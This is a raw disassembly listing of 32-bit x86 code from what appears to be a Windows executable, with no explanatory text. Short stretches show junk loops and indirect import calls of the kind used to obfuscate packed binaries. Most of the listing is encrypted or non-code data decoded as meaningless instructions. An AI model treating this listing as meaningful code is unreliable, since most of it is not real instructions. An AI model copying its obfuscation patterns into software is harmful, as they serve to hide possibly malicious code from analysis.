  40a02a:	add    BYTE PTR [ebx+0x5f455e48],cl
  40a030:	push   esi
  40a031:	pop    es
  40a032:	jne    0x409fee
  40a034:	jg     0x409ff9
  40a036:	mov    bl,0xfb
  40a038:	fst    DWORD PTR [ebx+0x1e]
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x1f60,0x61
  40a1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b5:	xchg   esi,eax
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	cmc    
  40a1bf:	repz popf 
  40a1c1:	pop    ebp
  40a1c2:	loop   0x40a17c
  40a1c4:	pop    edi
  40a1c5:	pop    es
  40a1c6:	scas   al,BYTE PTR es:[edi]
  40a1c7:	lock mov ah,0xe4
  40a1ca:	arpl   WORD PTR [edx+edi*1],dx
  40a1cd:	jle    0x40a208
  40a1cf:	lock rcl ecx,1
  40a1d2:	mov    bl,0xca
  40a1d4:	inc    ebp
  40a1d5:	ret    0xd7cd
  40a1d8:	xlat   BYTE PTR ds:[ebx]
  40a1d9:	add    ecx,DWORD PTR [ecx]
  40a1db:	xchg   edi,eax
  40a1dc:	lds    edx,FWORD PTR [edi]
  40a1de:	retf   0xc4b0
  40a1e1:	or     DWORD PTR [bx+di],edi
  40a1e4:	jp     0x40a16d
  40a1e6:	mov    ch,0x5
  40a1e8:	data16 loopne 0x40a226
  40a1eb:	ss xchg ecx,eax
  40a1ed:	sar    DWORD PTR [esp+ebp*2+0x7e1b9201],0xd7
  40a1f5:	add    al,0x93
  40a1f7:	aad    0xdd
  40a1f9:	test   BYTE PTR [edi-0x42a4a97d],dh
  40a1ff:	inc    DWORD PTR [ecx]
  40a201:	push   0x332e8a65
  40a206:	mov    BYTE PTR [esi],0x3c
  40a209:	cmp    dl,BYTE PTR [ebx-0x17]
  40a20c:	xor    ebp,DWORD PTR [edi-0x37]
  40a20f:	xor    dl,BYTE PTR [edi+edx*1-0x2640c00c]
  40a216:	dec    BYTE PTR [eax+0x3090e109]
  40a21c:	or     al,0x54
  40a21e:	call   0x7d0f682
  40a223:	retf   
  40a224:	(bad)
  40a227:	(bad)  
  40a229:	arpl   si,bx
  40a22b:	iret   
  40a22c:	and    al,0x4d
  40a22e:	cmp    al,0x7e
  40a230:	daa    
  40a231:	aam    0xe7
  40a233:	popf   
  40a234:	xchg   esp,eax
  40a235:	inc    ebx
  40a236:	xchg   edi,eax
  40a237:	pop    ebp
  40a238:	fistp  DWORD PTR [eax]
  40a23a:	inc    ebp
  40a23b:	imul   edi,DWORD PTR [ebx+0x31],0x34b134da
  40a242:	(bad)  
  40a243:	cli    
  40a244:	xchg   edx,eax
  40a245:	stos   BYTE PTR es:[edi],al
  40a246:	xor    al,0x1d
  40a248:	shr    DWORD PTR [edx],cl
  40a24a:	pop    esi
  40a24b:	rol    edi,1
  40a24d:	xchg   DWORD PTR [ecx],eax
  40a24f:	add    al,0x89
  40a251:	push   cs
  40a252:	xchg   cl,ah
  40a254:	mov    al,0x78
  40a256:	mov    WORD PTR [eax],gs
  40a258:	mov    esp,0xf74bb9cc
  40a25d:	aaa    
  40a25e:	out    0x2e,eax
  40a260:	imul   ecx,ebx,0xe569cbfe
  40a266:	call   0x8d452686
  40a26b:	cmp    eax,0x563870d2
  40a270:	out    0x18,al
  40a272:	pop    esp
  40a273:	sub    eax,0x21d88402
  40a278:	inc    edi
  40a279:	out    0x15,al
  40a27b:	test   DWORD PTR [esi],ecx
  40a27d:	cwde   
  40a27e:	push   ebx
  40a27f:	imul   esp,DWORD PTR [edx+eax*2-0x423302b0],0x10c394a0
  40a28a:	jmp    0x5505:0x5bcb2607
  40a291:	sets   al
  40a294:	push   es
  40a295:	cmp    al,0xcb
  40a297:	sbb    dh,BYTE PTR [ecx]
  40a299:	ss jmp 0x40a249
  40a29c:	mov    esi,0x6ac268e7
  40a2a1:	rcr    BYTE PTR [esi-0x2fea173b],1
  40a2a7:	repnz sbb al,BYTE PTR [esi]
  40a2aa:	mov    ds:0x5d8a47df,eax
  40a2af:	sub    al,0x31
  40a2b1:	es xchg edi,eax
  40a2b3:	sbb    bh,0x3c
  40a2b6:	push   cs
  40a2b7:	sub    DWORD PTR [ebx+0x2f40c3d7],0x51
  40a2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bf:	lea    eax,[esi-0x1328440d]
  40a2c5:	mov    ebx,0x8b8a0b2a
  40a2ca:	(bad)  
  40a2cb:	cmp    eax,DWORD PTR [eax-0x290a36e5]
  40a2d1:	ins    BYTE PTR es:[edi],dx
  40a2d2:	(bad)  
  40a2d3:	or     al,0x1a
  40a2d5:	js     0x40a2f5
  40a2d7:	xchg   edx,eax
  40a2d8:	cmc    
  40a2d9:	shr    ebp,0x12
  40a2dc:	call   0xb9f8:0x8091b8e0
  40a2e3:	ret    
  40a2e4:	mov    al,0x1a
  40a2e6:	jae    0x40a304
  40a2e8:	and    ah,BYTE PTR [edi-0x14]
  40a2eb:	imul   esi,DWORD PTR [edi-0x6e],0x38
  40a2ef:	inc    ebx
  40a2f0:	sbb    edi,esp
  40a2f2:	mov    bl,al
  40a2f4:	mov    dh,0x5c
  40a2f6:	pop    ds
  40a2f7:	mov    dl,0xbb
  40a2f9:	mov    ah,0x52
  40a2fb:	pop    ebx
  40a2fc:	mov    ds,eax
  40a2fe:	fs (bad) 
  40a301:	jns    0x40a37d
  40a303:	popf   
  40a304:	popa   
  40a305:	stc    
  40a306:	test   al,0x8
  40a308:	sahf   
  40a309:	rol    DWORD PTR [esi+0x1480a276],1
  40a30f:	or     al,0x61
  40a311:	ja     0x40a34f
  40a313:	arpl   WORD PTR [esi-0x48],bp
  40a316:	push   ebx
  40a317:	ret    
  40a318:	mov    WORD PTR [edx],fs
  40a31a:	call   0xa702a81f
  40a31f:	cmp    DWORD PTR [edi-0x54264bb5],0x4b
  40a326:	inc    bh
  40a328:	addr16 xor ah,0x41
  40a32c:	push   ebp
  40a32d:	int3   
  40a32e:	iret   
  40a32f:	adc    esp,ebx
  40a331:	and    BYTE PTR [edx-0xf9190d0],0x92
  40a338:	mov    bl,0xe1
  40a33a:	inc    edx
  40a33b:	iret   
  40a33c:	jb     0x40a316
  40a33e:	mulps  xmm0,xmm6
  40a341:	sub    eax,0xe5206fca
  40a346:	mov    esp,0x90cdd8c5
  40a34b:	add    BYTE PTR [eax+0x76ab79e1],0x98
  40a352:	fs cmc 
  40a354:	xchg   ebx,eax
  40a355:	sbb    cl,bl
  40a357:	fcomp  QWORD PTR [eax-0x47a69c06]
  40a35d:	pop    ebp
  40a35e:	pop    edx
  40a35f:	popf   
  40a360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a361:	pop    esi
  40a362:	xchg   ebp,eax
  40a363:	or     dh,BYTE PTR ss:[esi+edi*2]
  40a367:	ins    DWORD PTR es:[edi],dx
  40a368:	mov    edi,DWORD PTR [edx+0x1c]
  40a36b:	xchg   edx,eax
  40a36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a36d:	inc    esi
  40a36e:	mov    DWORD PTR [eax],ecx
  40a370:	sub    al,BYTE PTR ds:0x346b6795
  40a376:	sbb    ecx,edi
  40a378:	je     0x40a31f
  40a37a:	mov    edi,0xcf1a6b50
  40a37f:	mov    al,ch
  40a381:	iret   
  40a382:	or     al,0x0
  40a384:	sbb    al,0x49
  40a386:	push   0xffffff95
  40a388:	mov    ds,WORD PTR [edi+0x4b8c6786]
  40a38e:	push   edi
  40a38f:	fisttp QWORD PTR [ebp+0x32f49f3c]
  40a395:	cmp    al,BYTE PTR [ebp-0x10]
  40a398:	into   
  40a399:	(bad)  
  40a39b:	add    al,BYTE PTR [ebp-0x7b]
  40a39e:	push   ebp
  40a39f:	sbb    DWORD PTR [edi],edx
  40a3a1:	inc    esp
  40a3a2:	mov    esi,0x215038c0
  40a3a7:	mov    cl,dh
  40a3a9:	pop    ss
  40a3aa:	and    al,0xec
  40a3ac:	sbb    BYTE PTR [edi-0x79],ah
  40a3af:	pop    ds
  40a3b0:	mov    ebx,0x76946895
  40a3b5:	mov    ch,0xcb
  40a3b7:	xchg   ecx,eax
  40a3b8:	adc    bl,BYTE PTR ds:0x394d04ae
  40a3be:	or     BYTE PTR [edi-0x52],al
  40a3c1:	fisub  WORD PTR [ecx]
  40a3c3:	test   BYTE PTR [edi+0x10],bh
  40a3c6:	rol    BYTE PTR [ecx+0x6],1
  40a3c9:	mov    eax,0x6aadadd2
  40a3ce:	imul   ecx,DWORD PTR [esi],0x39
  40a3d1:	fwait
  40a3d2:	xchg   ebp,eax
  40a3d3:	mov    eax,ds:0x27f7425
  40a3d8:	push   0xfce82403
  40a3dd:	iret   
  40a3de:	(bad)  
  40a3e0:	mov    dh,0xdf
  40a3e2:	mov    bh,0xc
  40a3e4:	test   al,0x5a
  40a3e6:	outs   dx,DWORD PTR ds:[esi]
  40a3e7:	sbb    BYTE PTR [edx-0x786c6dd0],cl
  40a3ed:	les    ecx,FWORD PTR [edx+0x32]
  40a3f0:	mov    ecx,0x49965d5f
  40a3f5:	mov    al,ds:0xfef81708
  40a3fa:	sar    ch,cl
  40a3fc:	and    BYTE PTR [eax+edx*8+0x44],bl
  40a400:	jo     0x40a3f4
  40a402:	and    esp,eax
  40a404:	loop   0x40a430
  40a406:	out    dx,al
  40a407:	retf   0x9f3
  40a40a:	inc    edi
  40a40b:	aas    
  40a40c:	cs (bad) 
  40a40e:	adc    eax,0xcff0e37a
  40a413:	out    dx,eax
  40a414:	xchg   BYTE PTR [ecx],bl
  40a416:	loopne 0x40a47e
  40a418:	or     ecx,DWORD PTR [eax-0x79]
  40a41b:	dec    esp
  40a41c:	into   
  40a41d:	retf   
  40a41e:	jle    0x40a3d4
  40a420:	pop    ss
  40a421:	push   ds
  40a422:	inc    edi
  40a423:	jnp    0x40a459
  40a425:	fcmovu st,st(2)
  40a427:	dec    esp
  40a428:	test   eax,esi
  40a42a:	sub    edi,DWORD PTR [eax+0x4622a567]
  40a430:	push   ss
  40a431:	pop    eax
  40a432:	lea    edx,[esi-0x11]
  40a435:	xchg   ecx,eax
  40a436:	or     eax,DWORD PTR [edi]
  40a438:	test   DWORD PTR [ebp+0x27d36573],ecx
  40a43e:	xchg   ebx,eax
  40a43f:	adc    al,0x29
  40a441:	adc    eax,0x1dd20add
  40a446:	push   edx
  40a447:	add    al,0xe2
  40a449:	cmpxchg BYTE PTR ds:0x944cc75f,al
  40a450:	mov    bl,0xbd
  40a452:	dec    esp
  40a453:	inc    esi
  40a454:	stos   BYTE PTR es:[edi],al
  40a455:	stos   DWORD PTR es:[edi],eax
  40a456:	hlt    
  40a457:	test   eax,0xf5a8778b
  40a45c:	fist   DWORD PTR [ecx]
  40a45e:	int3   
  40a45f:	adc    eax,0x29d22935
  40a464:	sub    al,0xbb
  40a466:	cmp    al,0xc3
  40a468:	in     al,0xff
  40a46a:	pop    ss
  40a46b:	clc    
  40a46c:	and    eax,0xbbd2a2aa
  40a471:	div    DWORD PTR [edx+0x1c]
  40a474:	call   0x3873:0x64c7e593
  40a47b:	dec    esp
  40a47c:	pop    edx
  40a47d:	jbe    0x40a435
  40a47f:	int    0x35
  40a481:	jmp    0x23c37355
  40a486:	inc    edi
  40a487:	xor    al,0x20
  40a489:	pusha  
  40a48a:	sbb    edi,DWORD PTR [esi]
  40a48c:	jp     0x40a457
  40a48e:	fmul   st,st(7)
  40a490:	outs   dx,BYTE PTR ds:[esi]
  40a491:	mov    ebp,0x73442a44
  40a496:	popa   
  40a497:	repz cmp bh,cl
  40a49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a49b:	in     eax,dx
  40a49c:	cmp    ah,BYTE PTR [ebp+0x654230c]
  40a4a2:	sub    bh,ch
  40a4a4:	rcl    DWORD PTR [eax+ebx*8-0x4e8157d3],1
  40a4ab:	xchg   esp,eax
  40a4ac:	push   0xcb53f273
  40a4b1:	sub    ecx,ebx
  40a4b3:	fsubp  st(7),st
  40a4b5:	inc    edi
  40a4b6:	nop
  40a4b7:	aaa    
  40a4b8:	imul   edx,DWORD PTR [ecx-0x7e23ba73],0x25
  40a4bf:	int    0xa7
  40a4c1:	inc    edx
  40a4c2:	add    ch,dh
  40a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	mov    DWORD PTR [eax+0x30d00042],ebp
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x5a],dh
  40a61b:	ds adc dh,bl
  40a61e:	fdivp  st(6),st
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	sbb    eax,0x68694a6c
  40a62b:	aaa    
  40a62c:	sub    DWORD PTR [esp+ebx*4],edi
  40a62f:	mov    dh,0x34
  40a631:	ret    0x6b
  40a634:	adc    al,0xeb
  40a636:	mov    eax,DWORD PTR [edx+0x3e]
  40a639:	call   0x7990:0xb2173706
  40a640:	mov    esi,0x22eaad83
  40a645:	mov    edi,ebx
  40a647:	pop    edx
  40a648:	js     0x40a692
  40a64a:	adc    ebx,DWORD PTR [esi]
  40a64c:	ret    0xdae5
  40a64f:	push   ebx
  40a650:	jae    0x40a6c8
  40a652:	shr    DWORD PTR [ebx+0x79],0xb2
  40a656:	xchg   esp,eax
  40a657:	push   edi
  40a658:	cmp    al,0x4a
  40a65a:	aam    0x66
  40a65c:	dec    ebx
  40a65d:	and    eax,0xa8eb5c57
  40a662:	int    0x1b
  40a664:	rcr    esp,cl
  40a666:	mov    dh,0xa2
  40a668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a669:	sti    
  40a66a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a66b:	add    dh,BYTE PTR [ebp+0x3b]
  40a66e:	rcr    DWORD PTR [ebx],1
  40a670:	(bad)  
  40a671:	xor    esp,DWORD PTR [edx+0x25]
  40a674:	(bad)  
  40a675:	daa    
  40a676:	mov    dl,0x87
  40a678:	aas    
  40a679:	mov    bh,0xa8
  40a67b:	pop    edx
  40a67c:	cs (bad) 
  40a67e:	jp     0x40a674
  40a680:	fsubr  QWORD PTR [esi]
  40a682:	or     al,bl
  40a684:	cdq    
  40a685:	adc    ch,dl
  40a687:	in     eax,dx
  40a688:	xchg   edi,eax
  40a689:	mov    ecx,0x3cc9b293
  40a68e:	xor    BYTE PTR ds:0xf3154b8d,bl
  40a694:	and    al,ch
  40a696:	hlt    
  40a697:	dec    eax
  40a698:	push   es
  40a699:	pusha  
  40a69a:	xchg   ecx,eax
  40a69b:	ins    BYTE PTR es:[edi],dx
  40a69c:	fstp   st(3)
  40a69e:	xchg   edi,eax
  40a69f:	loop   0x40a702
  40a6a1:	fld    DWORD PTR [esp+esi*1+0x0]
  40a6a5:	add    ebx,esi
  40a6a7:	into   
  40a6a8:	(bad)  
  40a6a9:	ror    bh,cl
  40a6ab:	mov    dh,0x5d
  40a6ad:	mov    ch,0x1e
  40a6af:	xchg   BYTE PTR ds:[edi-0x59339a8b],ah
  40a6b6:	mov    ch,0x25
  40a6b8:	retf   0xe291
  40a6bb:	lahf   
  40a6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6bd:	sbb    al,0xd5
  40a6bf:	sub    eax,0x7897c8ae
  40a6c4:	test   eax,0x75f8801f
  40a6c9:	cmc    
  40a6ca:	mov    edi,0x547ed3c9
  40a6cf:	bnd jge 0x40a688
  40a6d2:	js     0x40a73f
  40a6d4:	inc    edi
  40a6d5:	enter  0x5b8f,0xfd
  40a6d9:	xchg   ebx,eax
  40a6da:	fcomi  st,st(3)
  40a6dc:	and    DWORD PTR [ebp+esi*2-0x75d25268],ecx
  40a6e3:	cmp    DWORD PTR [edi],ebx
  40a6e5:	dec    edx
  40a6e6:	and    ebx,DWORD PTR [esi+0x79]
  40a6e9:	xor    ch,BYTE PTR [edi+0x7]
  40a6ec:	sub    eax,0xfdac93de
  40a6f1:	pop    esi
  40a6f2:	jmp    0x6015d95d
  40a6f7:	icebp  
  40a6f8:	cmp    dl,dh
  40a6fa:	jmp    0x40a6fa
  40a6fc:	gs pop edi
  40a6fe:	clc    
  40a6ff:	setle  BYTE PTR [eax]
  40a702:	add    BYTE PTR cs:[ecx],dh
  40a705:	sti    
  40a706:	adc    eax,0x5869fd41
  40a70b:	sahf   
  40a70c:	lock or eax,DWORD PTR [edx]
  40a70f:	xchg   edx,eax
  40a710:	cld    
  40a711:	sbb    al,0xf6
  40a713:	xchg   edx,eax
  40a714:	(bad)  
  40a715:	push   edx
  40a716:	adc    BYTE PTR [ebp+0x11141ddf],al
  40a71c:	pop    ebx
  40a71d:	mov    esp,0x732b1be8
  40a722:	inc    ebp
  40a723:	mov    ecx,0x51f2cfe0
  40a728:	fldenv [eax+esi*4]
  40a72b:	int3   
  40a72c:	das    
  40a72d:	das    
  40a72e:	imul   ebp,DWORD PTR [eax],0x3665b46b
  40a734:	xchg   ecx,eax
  40a735:	sub    DWORD PTR [ecx+edx*8],eax
  40a738:	jns    0x40a74f
  40a73a:	sub    DWORD PTR [esi+edx*1+0x77c0284c],ebx
  40a741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a742:	dec    edi
  40a743:	dec    ecx
  40a744:	adc    eax,DWORD PTR [edi]
  40a746:	je     0x40a720
  40a748:	popa   
  40a749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a74a:	stos   BYTE PTR es:[edi],al
  40a74b:	mov    esi,0xeb4eba50
  40a750:	retf   
  40a751:	pop    esp
  40a752:	inc    ebp
  40a753:	adc    eax,0x21256861
  40a758:	lods   al,BYTE PTR ds:[esi]
  40a759:	dec    ebx
  40a75a:	add    DWORD PTR [esi-0x59],esp
  40a75d:	call   0xdf57a315
  40a762:	inc    edx
  40a763:	(bad)  
  40a764:	mov    es:0x2abb78bd,al
  40a76a:	mov    WORD PTR [eax-0xf9c1f8f],ss
  40a770:	cmovb  esp,ebp
  40a773:	push   0xffffffd3
  40a775:	sub    cl,bh
  40a777:	push   0x6
  40a779:	cmp    dl,BYTE PTR ds:0x55953c9d
  40a77f:	xlat   BYTE PTR ds:[ebx]
  40a780:	add    ah,BYTE PTR [edi+0x4f]
  40a783:	mov    bl,0xcd
  40a785:	clc    
  40a786:	ficomp DWORD PTR [edx]
  40a788:	xchg   ecx,eax
  40a789:	cmp    DWORD PTR [ebp+eiz*4-0x2a5ba52c],ebx
  40a790:	in     al,0xb1
  40a792:	sub    esp,DWORD PTR [esi+0x1af11178]
  40a798:	sub    eax,0x44c60beb
  40a79d:	push   ebp
  40a79e:	aaa    
  40a79f:	in     eax,dx
  40a7a0:	or     eax,0xf6fe658b
  40a7a5:	mov    edx,es
  40a7a7:	test   ebx,esi
  40a7a9:	das    
  40a7aa:	(bad)  
  40a7ab:	iret   
  40a7ac:	stos   BYTE PTR es:[edi],al
  40a7ad:	cmp    edx,DWORD PTR [ebx]
  40a7af:	cdq    
  40a7b0:	dec    esp
  40a7b1:	sub    al,0x63
  40a7b3:	sbb    al,0xc4
  40a7b5:	mov    ch,0xd7
  40a7b7:	and    al,0x43
  40a7b9:	mov    DWORD PTR [esi+esi*4-0x59],ecx
  40a7bd:	fisttp WORD PTR [eax+0x65]
  40a7c0:	add    BYTE PTR [ecx+0x75],bh
  40a7c3:	and    edi,DWORD PTR [edi-0x33afba9d]
  40a7c9:	les    edx,FWORD PTR [edx]
  40a7cb:	jbe    0x40a761
  40a7cd:	inc    ebx
  40a7ce:	adc    bl,BYTE PTR [ecx]
  40a7d0:	adc    DWORD PTR [esi-0x4107fedd],esp
  40a7d6:	xchg   BYTE PTR [ebp+eiz*8-0x629b5d66],ah
  40a7dd:	enter  0xc95c,0xf1
  40a7e1:	imul   eax,DWORD PTR [ebx+0x5c9628a9],0xcf37557c
  40a7eb:	adc    al,0xd6
  40a7ed:	call   0x23e4:0xd3440b14
  40a7f4:	fnstcw WORD PTR [esi+0x7af96817]
  40a7fa:	in     al,0xcd
  40a7fc:	jmp    0x40a7a6
  40a7fe:	nop
  40a7ff:	lahf   
  40a800:	out    0xbe,al
  40a802:	pop    ecx
  40a803:	and    DWORD PTR [edi-0x6776ffec],0xe05a1bad
  40a80d:	xor    BYTE PTR [ebp-0x49],bl
  40a810:	push   eax
  40a811:	inc    esi
  40a812:	(bad)  
  40a813:	in     eax,0x58
  40a815:	outs   dx,DWORD PTR ds:[esi]
  40a816:	hlt    
  40a817:	mov    cl,0xd0
  40a819:	pop    edi
  40a81a:	add    DWORD PTR ds:0xb998e47d,0x62f0c6c9
  40a824:	imul   edx,ebp,0x52
  40a827:	sbb    esp,ecx
  40a829:	pop    edx
  40a82a:	mov    ebp,0x7b567b01
  40a82f:	cmp    esp,DWORD PTR [edx+0x4b235217]
  40a835:	push   cs
  40a836:	mov    al,ds:0x89ddb3b3
  40a83b:	mov    al,0x7a
  40a83d:	mov    dh,0xae
  40a83f:	mov    dh,0x29
  40a841:	(bad)  
  40a842:	fnsave [edi]
  40a844:	hlt    
  40a845:	xor    eax,DWORD PTR [ecx]
  40a847:	sti    
  40a848:	cmp    eax,0x6598e4b1
  40a84d:	fisttp DWORD PTR fs:[eax+edi*4+0x168f1e1d]
  40a855:	mov    bh,0xc1
  40a857:	call   0x6c5d:0xbf66e13
  40a85e:	into   
  40a85f:	popf   
  40a860:	mov    ds:0xa8c2e37e,al
  40a865:	loopne 0x40a86f
  40a867:	loopne 0x40a8b7
  40a869:	cli    
  40a86a:	mov    dh,0xc5
  40a86c:	xchg   esi,eax
  40a86d:	jb     0x40a868
  40a86f:	mov    edx,0x1b0a6675
  40a874:	sbb    eax,0x80e625a8
  40a879:	push   es
  40a87a:	xlat   BYTE PTR ds:[ebx]
  40a87b:	retf   
  40a87c:	cmc    
  40a87d:	or     BYTE PTR [esi+edi*1+0x3ab2a6f2],dh
  40a884:	mov    esi,cs
  40a886:	add    BYTE PTR [ebp+edx*1-0x2c],bl
  40a88a:	mov    esi,0xb49a3a5d
  40a88f:	pusha  
  40a890:	inc    eax
  40a891:	add    edi,DWORD PTR [edi]
  40a893:	sbb    dh,cl
  40a895:	and    al,0x14
  40a897:	mov    ah,0xfd
  40a899:	inc    esi
  40a89a:	in     al,dx
  40a89b:	sbb    al,0x84
  40a89d:	push   0x76415ce
  40a8a2:	inc    ecx
  40a8a3:	hlt    
  40a8a4:	ins    DWORD PTR es:[edi],dx
  40a8a5:	jle    0x40a8c0
  40a8a7:	arpl   WORD PTR [eax-0x27],si
  40a8aa:	int3   
  40a8ab:	mov    ebx,0x119f8a0b
  40a8b0:	pop    esi
  40a8b1:	frstor [ecx-0x2120c751]
  40a8b7:	and    DWORD PTR [edx],esi
  40a8b9:	jmp    0x40a8db
  40a8bb:	sub    eax,0xd129bdc6
  40a8c0:	pop    ds
  40a8c1:	ret    0xb5f1
  40a8c4:	pop    esi
  40a8c5:	mov    BYTE PTR [ecx],dl
  40a8c7:	and    DWORD PTR [ecx],edi
  40a8c9:	push   cs
